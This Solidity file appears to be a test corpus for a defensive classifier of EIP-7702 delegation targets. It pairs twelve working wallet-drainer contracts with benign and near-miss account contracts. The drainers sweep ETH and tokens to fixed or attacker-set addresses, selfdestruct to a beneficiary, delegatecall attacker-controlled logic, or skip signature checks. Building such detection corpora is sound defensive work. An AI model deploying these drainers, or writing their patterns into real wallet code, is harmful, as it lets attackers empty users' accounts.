// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {PackedUserOperation} from "@openzeppelin/contracts/interfaces/IERC4337.sol";

// Corpus for the defensive EIP-7702 delegation-target classifier (bundler/src/classifier). These contracts are
// compiled by `forge build` so that the TypeScript tests analyze real solc output. The "sweeper" samples reproduce
// the publicly documented drainer patterns in their simplest form so that the wallet can refuse to sign an
// authorization to them. Test fixtures only: never deploy.

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

// ------------------------------------------------------------------------------------------------ malicious (12)

/// @dev Forwards every incoming payment and the whole balance to a hardcoded address.
contract SweeperReceiveForward {
    receive() external payable {
        (bool ok,) = payable(0x6666666666666666666666666666666666666666).call{value: address(this).balance}("");
        require(ok);
    }
}

/// @dev "Configurable" drainer: the recipient lives in storage (set once by the attacker), not in the code.
contract SweeperStorageRecipient {
    address private sink;

    function init(address sink_) external {
        if (sink == address(0)) sink = sink_;
    }

    fallback() external payable {
        payable(sink).transfer(address(this).balance);
    }
}

/// @dev Self-destructs to a hardcoded beneficiary (post-Cancun this still transfers the whole balance).
contract SweeperSelfdestruct {
    fallback() external payable {
        selfdestruct(payable(0x1111111111111111111111111111111111111111));
    }
}

/// @dev Sweeps a hardcoded ERC-20 and ETH to a hardcoded address on any call.
contract SweeperTokenDrain {
    fallback() external payable {
        IERC20Like token = IERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        token.transfer(0x2222222222222222222222222222222222222222, token.balanceOf(address(this)));
    }
}

/// @dev Looks like a batch executor, but its receive hook forwards value to a hardcoded address.
contract SweeperWithDecoyExecutor {
    struct Call {
        address to;
        uint256 value;
        bytes data;
    }

    function execute(Call[] calldata calls) external payable {
        require(msg.sender == address(this), "only self");
        for (uint256 i = 0; i < calls.length; ++i) {
            (bool ok,) = calls[i].to.call{value: calls[i].value}(calls[i].data);
            require(ok);
        }
    }

    receive() external payable {
        payable(0x3333333333333333333333333333333333333333).transfer(msg.value);
    }
}

/// @dev Forwards every call to hardcoded logic the attacker can change at will.
contract SweeperDelegatecall {
    fallback() external payable {
        (bool ok,) = address(0x4444444444444444444444444444444444444444).delegatecall(msg.data);
        require(ok);
    }
}

/// @dev Lets any caller withdraw the whole balance: SELFBALANCE sent to msg.sender, with no guard.
contract SweeperToCaller {
    fallback() external payable {
        payable(msg.sender).transfer(address(this).balance);
    }
}

/// @dev Unprotected executor: anyone can make the delegating EOA send any value and call anything.
contract OpenExecutor {
    function execute(address to, uint256 value, bytes calldata data) external payable {
        (bool ok,) = to.call{value: value}(data);
        require(ok);
    }

    receive() external payable {}
}

/// @dev Executor "guarded" by a hardcoded address: whoever holds that key controls every delegating EOA.
contract AttackerOwnedExecutor {
    function execute(address to, uint256 value, bytes calldata data) external payable {
        require(msg.sender == 0xBAdBadbADBaDBADBadbADbaDBadBaDBADBadBAD0, "not owner");
        (bool ok,) = to.call{value: value}(data);
        require(ok);
    }

    receive() external payable {}
}

interface IBeaconLike {
    function implementation() external view returns (address);
}

/// @dev Delegates every call to logic read from a hardcoded beacon that the attacker can repoint at any time.
contract BeaconProxyDelegate {
    fallback() external payable {
        address logic = IBeaconLike(0x7777777777777777777777777777777777777777).implementation();
        // Standard proxy forwarding: copy calldata, delegatecall, bubble the result.
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), logic, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if iszero(ok) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }
}

/// @dev Forwards every incoming payment to a recipient set by whoever calls `setRecipient` first.
contract ForwardValueToStorage {
    address private recipient;

    function setRecipient(address recipient_) external {
        if (recipient == address(0)) recipient = recipient_;
    }

    receive() external payable {
        payable(recipient).transfer(msg.value);
    }
}

/// @dev Looks like an ERC-4337 account for the canonical EntryPoint v0.9, but validateUserOp accepts every operation, so
/// anyone can make the EntryPoint run `execute` for the delegating EOA.
contract UnverifiedUserOpAccount {
    address internal constant ENTRY_POINT = 0x433709009B8330FDa32311DF1C2AFA402eD8D009;

    function validateUserOp(PackedUserOperation calldata, bytes32, uint256 missingAccountFunds)
        external
        returns (uint256)
    {
        require(msg.sender == ENTRY_POINT, "only EntryPoint");
        if (missingAccountFunds > 0) {
            (bool ok,) = payable(msg.sender).call{value: missingAccountFunds}("");
            ok;
        }
        return 0;
    }

    function execute(address to, uint256 value, bytes calldata data) external {
        require(msg.sender == ENTRY_POINT || msg.sender == address(this), "not authorized");
        (bool ok,) = to.call{value: value}(data);
        require(ok);
    }

    receive() external payable {}
}

// ------------------------------------------------------------------------------------------------ benign (5 here)
// The other three benign samples are PasskeyAccount, eth-infinitism Simple7702Account and TestUSD.

/// @dev Minimal ERC-4337 account for the canonical EntryPoint v0.9 that does verify: the EOA's own ECDSA signature.
contract EcdsaEntryPointAccount {
    address internal constant ENTRY_POINT = 0x433709009B8330FDa32311DF1C2AFA402eD8D009;

    function validateUserOp(PackedUserOperation calldata userOp, bytes32 userOpHash, uint256 missingAccountFunds)
        external
        returns (uint256)
    {
        require(msg.sender == ENTRY_POINT, "only EntryPoint");
        bytes calldata sig = userOp.signature;
        require(sig.length == 65, "bad signature length");
        address signer = ecrecover(userOpHash, uint8(sig[64]), bytes32(sig[0:32]), bytes32(sig[32:64]));
        if (missingAccountFunds > 0) {
            (bool ok,) = payable(msg.sender).call{value: missingAccountFunds}("");
            ok;
        }
        return signer == address(this) ? 0 : 1;
    }

    function execute(address to, uint256 value, bytes calldata data) external {
        require(msg.sender == ENTRY_POINT || msg.sender == address(this), "not authorized");
        (bool ok,) = to.call{value: value}(data);
        require(ok);
    }

    receive() external payable {}
}

/// @dev Near miss: sends msg.value straight back to msg.sender, which moves nothing the EOA owned.
contract RefundToSender {
    function refund() external payable {
        payable(msg.sender).transfer(msg.value);
    }

    receive() external payable {}
}

/// @dev A minimal EIP-7702 batch executor: only the EOA itself can execute, targets come from calldata.
contract MinimalBatchExecutor {
    struct Call {
        address to;
        uint256 value;
        bytes data;
    }

    function execute(Call[] calldata calls) external payable {
        require(msg.sender == address(this), "only self");
        for (uint256 i = 0; i < calls.length; ++i) {
            (bool ok,) = calls[i].to.call{value: calls[i].value}(calls[i].data);
            require(ok);
        }
    }

    receive() external payable {}
}

/// @dev Near miss: a hardcoded cold wallet, but reachable only through a named, self-gated function.
contract ColdStorageForwarder {
    function sweepToCold() external {
        require(msg.sender == address(this), "only self");
        payable(0x5555555555555555555555555555555555555555).transfer(address(this).balance);
    }

    receive() external payable {}
}

/// @dev Accepts anything, like an EOA would.
contract EmptyEoaMimic {
    receive() external payable {}

    fallback() external payable {}
}
